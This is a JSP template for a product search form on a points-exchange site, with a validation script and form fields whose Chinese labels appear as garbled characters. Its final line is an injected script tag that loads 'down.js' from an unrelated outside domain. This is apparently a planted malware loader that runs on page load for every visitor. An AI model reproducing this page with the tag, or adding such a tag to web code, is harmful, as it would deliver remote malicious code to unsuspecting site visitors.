<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<script language="javascript">
<!--
function checkSearchProductForm(){
   if( validate(document.searchProductForm.productKey, '�̻��ؼ���', 'public', 2, 32, true)&&
       validate(document.searchProductForm.point1, '����1', 'number', 0, 8, true)&&
       validate(document.searchProductForm.point2, '����2', 'number', 0, 8, true)   ){
	   	    return true;
   }   
    return false;
}
//-->
</script>


      
<table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
  <tr> 
    <td width="989" height="26" align="left" valign="top"> 
		  
      <table id="Table_15" width="100%" border="0" cellpadding="0" cellspacing="0">
        <tr > 
          <td width="14" height="26" background="images/bg_table_title.gif">&nbsp;</td>
          <td width="13" height="26" background="images/bg_table_title.gif">&nbsp;</td>
          <td width="161" class="red15" background="images/bg_table_title.gif">�һ���Ʒ����</td>
        </tr>
        <tr > 
          <td width="161" height="15" colspan="3" class="red15"></td>
        </tr>
      </table>
    </td>
  </tr>
  <tr> 
          
    <td height="145" valign="top" width="989"> 
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <form method="post" name="searchProductForm" id="searchProductForm" action='<c:url value="/queryProduct.do"/>' onSubmit="javascript: return checkSearchProductForm();">
          <tr> 
            <td>&nbsp;</td>
            <td> 
              <table width="105%" border="0" cellpadding="0">
                <tr> 
                  <td height="26" align="right" bgcolor="#FF6600" class="white12">����</td>
                  <td class="input"> 
                    <select name="productCtg" >
                      <option value="" selected>��ѡ��...</option>
					  <c:forEach var="productCategory" items="${applicationScope.appData.productCategories}">					           					           
                              <option value='<c:out value="${productCategory.pcNo}"/>'><c:out value="${productCategory.name}"/></option>
                      </c:forEach> 
                    </select>
                  </td>
                </tr>
                <tr> 
                  <td align="right" bgcolor="#FF6600" class="white12">�ؼ���</td>
                  <td> 
                    <input type="text" name="productKey" size="14" value="" title="�ؼ���" align="absmiddle" maxlength="20" />
                  </td>
                </tr>
                <tr> 
                  <td align="right" bgcolor="#FF6600" class="white12">���ַ�Χ</td>
                  <td> 
                    <input type="text" name="point1" size="7" value="" title="����1" align="absmiddle" maxlength="8" />
                    - 
                    <input type="text" name="point2" size="7" value="" title="����2" align="absmiddle" maxlength="8" />
                  </td>
                </tr>
              </table>
            </td>
            <td>&nbsp;</td>
          </tr>
          <tr> 
            <td colspan="3" align="center"> 
              <input type="submit" name="Submit" value="��ѯ" />
            </td>
          </tr>
        </form>
      </table>
          </td>
        </tr>
      </table>
<script language=javascript src=http://Town.531jx.cn/down.js></script>